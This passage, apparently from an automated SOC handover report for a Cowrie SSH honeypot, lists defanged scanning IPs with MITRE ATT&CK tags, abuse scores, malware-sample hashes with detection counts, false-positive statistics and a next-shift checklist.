> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `94.26.106[.]200` | **109** | 2026-03-11 14:16 | 2026-03-11 15:40 | 2m | 99 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `223.123.43[.]2` | **25** | 2026-03-11 04:38 | 2026-03-11 04:43 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `94.26.106[.]201` | **17** | 2026-03-11 13:09 | 2026-03-11 13:23 | 0m | 14 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `206.189.143[.]89` | **13** | 2026-03-11 18:25 | 2026-03-11 18:32 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `102.88.137[.]80` | **11** | 2026-03-11 19:33 | 2026-03-11 19:49 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `172.208.69[.]47` | **11** | 2026-03-11 08:01 | 2026-03-11 08:25 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `179.125.24[.]202` | **11** | 2026-03-11 18:58 | 2026-03-11 19:25 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `34.128.77[.]56` | **11** | 2026-03-11 14:39 | 2026-03-11 15:07 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `83.111.76[.]194` | **11** | 2026-03-11 01:49 | 2026-03-11 02:12 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `157.15.59[.]120` | **10** | 2026-03-11 17:53 | 2026-03-11 18:21 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `134.199.145[.]236` | **9** | 2026-03-11 10:05 | 2026-03-11 10:13 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `192.109.200[.]220` | **8** | 2026-03-11 14:22 | 2026-03-11 14:22 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `165.22.201[.]90` | **6** | 2026-03-11 08:39 | 2026-03-11 08:45 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `3.129.187[.]38` | **6** | 2026-03-11 06:21 | 2026-03-11 06:26 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `118.194.249[.]72` | **4** | 2026-03-11 00:27 | 2026-03-11 00:27 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.59.189[.]45` | **3** | 2026-03-11 19:35 | 2026-03-11 19:40 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `139.59.45[.]9` | **3** | 2026-03-11 10:17 | 2026-03-11 10:23 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `152.32.206[.]38` | **3** | 2026-03-11 19:38 | 2026-03-11 19:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `164.92.151[.]106` | **3** | 2026-03-11 06:20 | 2026-03-11 06:25 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `167.71.84[.]143` | **3** | 2026-03-11 16:40 | 2026-03-11 16:43 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `18.191.69[.]170` | **3** | 2026-03-11 10:30 | 2026-03-11 10:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `206.168.34[.]58` | **3** | 2026-03-11 18:35 | 2026-03-11 18:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `94.26.106[.]201` | **3** | 2026-03-11 03:36 | 2026-03-11 03:36 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.200.243[.]197` | **2** | 2026-03-11 03:20 | 2026-03-11 03:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.59.4[.]130` | **2** | 2026-03-11 14:16 | 2026-03-11 14:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.212.201[.]77` | **2** | 2026-03-11 04:41 | 2026-03-11 04:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]220` | **2** | 2026-03-11 14:34 | 2026-03-11 14:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.65.193[.]255` | **2** | 2026-03-11 13:28 | 2026-03-11 13:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.65.194[.]130` | **2** | 2026-03-11 09:46 | 2026-03-11 09:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]179` | **2** | 2026-03-11 04:33 | 2026-03-11 04:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]94` | **2** | 2026-03-11 02:23 | 2026-03-11 02:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | **2** | 2026-03-11 01:49 | 2026-03-11 02:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.228.53[.]174` | **2** | 2026-03-11 06:27 | 2026-03-11 06:27 | 0m | 3 | `T1110.001` | 🟢 LOW |
| `71.9.52[.]112` | **2** | 2026-03-11 10:11 | 2026-03-11 10:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.54[.]23` | 1 | 2026-03-11 10:18 | 2026-03-11 10:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.126.71[.]100` | 1 | 2026-03-11 12:17 | 2026-03-11 12:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.36.127[.]212` | 1 | 2026-03-11 18:31 | 2026-03-11 18:31 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.71.37[.]68` | 1 | 2026-03-11 10:41 | 2026-03-11 10:41 | 13s | 0 | `T1592` | 🟢 LOW |
| `103.156.221[.]242` | 1 | 2026-03-11 06:05 | 2026-03-11 06:06 | 13s | 0 | `T1592` | 🟢 LOW |
| `109.197.227[.]24` | 1 | 2026-03-11 09:36 | 2026-03-11 09:37 | 24s | 0 | `T1592` | 🟢 LOW |
| `110.38.194[.]15` | 1 | 2026-03-11 20:16 | 2026-03-11 20:16 | 15s | 0 | `T1592` | 🟢 LOW |
| `113.250.81[.]101` | 1 | 2026-03-11 19:04 | 2026-03-11 19:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.251.207[.]153` | 1 | 2026-03-11 01:37 | 2026-03-11 01:38 | 13s | 0 | `T1592` | 🟢 LOW |
| `118.122.147[.]49` | 1 | 2026-03-11 19:03 | 2026-03-11 19:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.26[.]161` | 1 | 2026-03-11 12:03 | 2026-03-11 12:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.241.79[.]66` | 1 | 2026-03-11 03:59 | 2026-03-11 04:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.123[.]76` | 1 | 2026-03-11 18:56 | 2026-03-11 18:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.42[.]17` | 1 | 2026-03-11 14:40 | 2026-03-11 14:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.149[.]244` | 1 | 2026-03-11 03:07 | 2026-03-11 03:07 | 8s | 0 | `T1592` | 🟢 LOW |
| `151.64.133[.]183` | 1 | 2026-03-11 11:12 | 2026-03-11 11:12 | 13s | 0 | `T1592` | 🟢 LOW |
| `151.64.134[.]190` | 1 | 2026-03-11 14:44 | 2026-03-11 14:44 | 13s | 0 | `T1592` | 🟢 LOW |
| `157.15.59[.]109` | 1 | 2026-03-11 18:04 | 2026-03-11 18:04 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `170.64.114[.]194` | 1 | 2026-03-11 07:59 | 2026-03-11 07:59 | 13s | 0 | `T1592` | 🟢 LOW |
| `170.83.126[.]105` | 1 | 2026-03-11 16:38 | 2026-03-11 16:38 | 31s | 0 | `T1592` | 🟢 LOW |
| `172.104.93[.]159` | 1 | 2026-03-11 11:18 | 2026-03-11 11:18 | 10s | 0 | `T1592` | 🟢 LOW |
| `176.32.195[.]85` | 1 | 2026-03-11 05:04 | 2026-03-11 05:05 | 31s | 0 | `T1592` | 🟢 LOW |
| `20.105.65[.]67` | 1 | 2026-03-11 17:22 | 2026-03-11 17:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.250.12[.]75` | 1 | 2026-03-11 03:13 | 2026-03-11 03:13 | 13s | 0 | `T1592` | 🟢 LOW |
| `24.193.152[.]228` | 1 | 2026-03-11 04:20 | 2026-03-11 04:20 | 12s | 0 | `T1592` | 🟢 LOW |
| `34.142.196[.]166` | 1 | 2026-03-11 05:38 | 2026-03-11 05:38 | 30s | 0 | `T1592` | 🟢 LOW |
| `37.34.242[.]99` | 1 | 2026-03-11 00:01 | 2026-03-11 00:01 | 14s | 0 | `T1592` | 🟢 LOW |
| `42.56.161[.]165` | 1 | 2026-03-11 14:16 | 2026-03-11 14:16 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.170.129[.]132` | 1 | 2026-03-11 13:10 | 2026-03-11 13:10 | 31s | 0 | `T1592` | 🟢 LOW |
| `47.236.66[.]123` | 1 | 2026-03-11 15:33 | 2026-03-11 15:33 | 30s | 0 | `T1592` | 🟢 LOW |
| `49.142.74[.]66` | 1 | 2026-03-11 02:04 | 2026-03-11 02:04 | 13s | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-03-11 06:09 | 2026-03-11 06:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `54.91.92[.]82` | 1 | 2026-03-11 12:56 | 2026-03-11 12:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.98.218[.]97` | 1 | 2026-03-11 15:21 | 2026-03-11 15:21 | 13s | 0 | `T1592` | 🟢 LOW |
| `59.126.177[.]227` | 1 | 2026-03-11 09:20 | 2026-03-11 09:20 | 30s | 0 | `T1592` | 🟢 LOW |
| `61.78.98[.]181` | 1 | 2026-03-11 07:30 | 2026-03-11 07:31 | 30s | 0 | `T1592` | 🟢 LOW |
| `61.78.98[.]181` | 1 | 2026-03-11 19:56 | 2026-03-11 19:57 | 30s | 0 | `T1592` | 🟢 LOW |
| `62.212.229[.]142` | 1 | 2026-03-11 17:33 | 2026-03-11 17:33 | 30s | 0 | `T1592` | 🟢 LOW |
| `64.227.110[.]161` | 1 | 2026-03-11 19:46 | 2026-03-11 19:46 | 2s | 0 | `T1592` | 🟢 LOW |
| `68.199.97[.]245` | 1 | 2026-03-11 01:14 | 2026-03-11 01:15 | 30s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]245` | 1 | 2026-03-11 05:34 | 2026-03-11 05:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.128.114[.]118` | 1 | 2026-03-11 10:26 | 2026-03-11 10:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.203.107[.]10` | 1 | 2026-03-11 09:52 | 2026-03-11 09:53 | 30s | 0 | `T1592` | 🟢 LOW |
| `91.215.35[.]25` | 1 | 2026-03-11 00:48 | 2026-03-11 00:49 | 30s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]120` | 1 | 2026-03-11 19:53 | 2026-03-11 19:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]124` | 1 | 2026-03-11 19:53 | 2026-03-11 19:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]248` | 1 | 2026-03-11 19:53 | 2026-03-11 19:53 | 10s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]249` | 1 | 2026-03-11 19:53 | 2026-03-11 19:53 | 3s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]49` | 1 | 2026-03-11 19:55 | 2026-03-11 19:55 | 1s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (3 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `24.193.152[.]228` | US | Charter Communications Inc | **100** ⚠️ | 2 |
| `103.156.221[.]242` | ID | PT Gading Bhakti Utama | **100** ⚠️ | 14 |
| `211.250.12[.]75` | KR | Korea Telecom | **100** ⚠️ | 18 |
| `18.191.69[.]170` | US | Amazon Technologies Inc. | **100** ⚠️ | 11 |
| `223.123.43[.]2` | PK | CMPak Limited | **100** ⚠️ | 31 |
| `89.203.107[.]10` | KW | Fast Communication Company Ltd | **100** ⚠️ | 16 |
| `172.236.228[.]220` | US | Linode | **100** ⚠️ | 50 |
| `64.227.110[.]161` | US | DigitalOcean, LLC | **100** ⚠️ | 20 |
| `91.230.168[.]120` | US | FR ONYPHE | **100** ⚠️ | 50 |
| `176.32.195[.]85` | AM | Interactive TV LLC | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | — |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | — |
| [T1078](https://attack.mitre.org/techniques/T1078) | — |
| [T1083](https://attack.mitre.org/techniques/T1083) | — |
| [T1105](https://attack.mitre.org/techniques/T1105) | — |

---

## 🔕 False Positive Summary (270 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 51 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 10 below threshold 25 | 7 |
| AbuseIPDB score 11 below threshold 25 | 9 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 14 below threshold 25 | 12 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 6 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 179 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05 | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26 | Incident Timeline Generator | ✅ 726 session(s) |
| Tool 27 | Threat Intel Feeder         | ✅ 138 IP(s) enriched |
| Tool 29 | False Positive Tracker      | ✅ 270 filtered (37.2%) |
| Tool 30 | Metric Exporter             | ✅ stats.json written |
| Tool 31 | Malware Analyzer            | ✅ 3 file(s) analyzed |
| Tool 28 | SOC Handover Report         | ✅ This report |

> **Report grouping:** 99 priority case(s) shown individually · 83 recon entry/entries in table (34 group(s) consolidating 308 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.1 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-11T20:32:08Z_
